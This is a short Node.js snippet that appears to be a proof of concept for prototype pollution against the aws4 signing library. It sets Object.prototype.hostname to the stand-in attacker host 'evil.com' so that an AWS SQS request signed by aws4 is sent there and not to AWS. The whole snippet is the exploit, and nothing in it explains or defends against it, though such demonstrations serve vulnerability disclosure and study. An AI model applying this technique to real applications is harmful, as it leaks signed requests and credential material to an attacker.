const https = require('https')
const aws4 = require('aws4')

// inject hostname
Object.prototype.hostname = 'evil.com';

// set request options - aws4 will infer the host from service and region:
const opts = {service: 'sqs', region: 'us-east-1', path: '/'}
aws4.sign(opts); // sign the request

// we can now use this to query AWS
const req = https.request(opts, function (res) {
    // ...
})